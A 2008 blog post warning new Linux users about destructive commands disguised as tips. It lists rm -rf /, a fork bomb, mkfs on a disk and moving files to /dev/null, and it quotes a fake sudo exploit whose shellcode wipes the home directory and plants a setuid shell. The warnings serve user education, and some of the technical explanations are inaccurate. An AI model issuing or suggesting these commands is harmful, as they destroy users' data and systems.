---
author: admin
comments: false
date: 2008-10-25 02:43:04+00:00
layout: post
slug: fun-with-linux-commands-ii-with-power-comes-responsibility
title: Fun with Linux Commands-II - With Power Comes Responsibility
wordpress_id: 244
categories:
- TerminalFunFive
tags:
- commands
- Linux
- terminal
- TerminalFunFive
---

Happy Linux Commanding! But be careful!





The heading is self-explanatory. Linux Terminal seems dump but nothing is more clever than it. Linux is powerful and fun. When it is about something's strength remember what [Uncle Ben said](http://www.imdb.com/title/tt0145487/quotes).





When you are new to Linux you often seek to get help from others and almost most of the advices you get will be in the form of some commands such as` ps, top, modprobe, lspci` etc. Be careful when you run these commands as some [Anti-Linux a**holes try to fool new Linux users in the name of tips and tutorials](http://linsux.org/index.php?topic=96.0).If after following such command(s), you lose all your files, no one is to be blamed but you.



<!-- more -->



If you want save yourself, here is one principle: Be aware of what you are doing! Just don't do what someone suggest you. Fireup _man_ page, look what the command is about. This way you can learn a couple of more options too. If you are in doubt about the commands, go to a couple of forums and put all information you have such as: **Hello I was trying to do this, and a guy from _forum.xyz.com_ suggest me to issue this command. I suspect this is a harmful command. Any suggestions?** Take my words, Linux carries a strong spirit with it - spirit to share knowledge. And you will get some good explanatory suggestions very quickly. If you are still in doubt, I suggest you to issue the commands inside virtual OS:





[ad]





Last thing first. Today I will be posting some harmful Linux commands. DO NOT ISSUE THESE COMMANDS! These commands are just for your information. These commands are not made for making harm to your computer, but with a couple of options it can be very dangerous. After all Linux doesn't know that a folder inside your home directory contains your first girlfriend's picture! It is your duty to ensure they are safe. Let's get started. I repeat **DON'T ISSUE THESE COMMANDS**. If you want to test, I suggest you to run them inside a virtual Linux OS.







  1. The king of all devils:





`rm -rf /`





Q. What does _rm_ do?





A. Removes a file





Q. What is _r_?





A. Recursion. That means inside a folder, of a folder, of a folder and so on





Q. what is _f_?





A. Force. It means you are saying to the command_ "Never ask me anything. Just do what you want to do"_





Q. What is _/_





A. Your _ROOT_ directory!





See what it does? _Recursively removes all the files inside your root directory without nagging you - "Should I delete this?"
_
There are various versions of _rm_ available such as:





_rm -rf .
rm -rf *_





Not only someone from outside, you yourself can screw up things sometimes. Little knowledge is dangerous! How about this - you want to delete all the hidden files inside a directory. That's easy right? Hidden files are denoted with **.** in front so you might be thinking this command **`rm - .*`** Nooooooooooo!!! It will delete all the files one level up of the current directory.







  1. How about backing up your home directory or some folders? Never try to do anything such as:





`mv /home/yourhomedirectory/* /dev/null`





Q. What is _mv_?





A. Move files





Q. What is _dev/null_?





A. Null means nothing. In other words, it is a black-hole.





If you issue above command, it will move all the files inside your home directory to a blackhole.







  1. Linux Terminal is not a toy to play, it's something to learn and do some productive things. I just mean to warn you don't type anything silly and hit enter such as this:





`:(){:|:&};:`





Those seem like emoticons but they are actually shell programming stuffs and have special meaning. The above command executes different process freezing your computer and you will get a BSOD, a sort of! ;-)







  1. How about making a Linux filesystem?





`mkfs.ext3 /dev/sda`





You hard disk's data are gone, and will never come back again. That was a poor farewell party for your documents.







  1. Do you know eyes and your knowledge both can lie? Well sometimes. What do you see in the following C file written by someone claiming [New sudo off-by-one poc exploit](http://seclists.org/fulldisclosure/2007/Aug/0071.html)? Any sign of devil?





> `...`

char esp[] __attribute__ ((section(".text"))) /* e.s.p
release */
= "xebx3ex5bx31xc0x50x54x5ax83xecx64x68"
"xffxffxffxffx68xdfxd0xdfxd9x68x8dx99"
"xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7"
"x56x04xf7x56x08xf7x56x0cx83xc4x74x56"
"x8dx73x08x56x53x54x59xb0x0bxcdx80x31"
"xc0x40xebxf9xe8xbdxffxffxffx2fx62x69"
"x6ex2fx73x68x00x2dx63x00"
"cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;";

...





Well this is a hex coded version of `**rm -rf ~ / &**` . This does nothing more than wiping off your home directory.





These are only a few guidelines you need to follow. If you know some more, drop them in comments.





If you want to learn Linux, conquer its power, have fun, and be productive, you need to be careful, helpful, and share your knowledge. If you have any knowledge on Linux that you want to share, let us know in comments or shoot me an email.





So what did you learn today?





[ad]



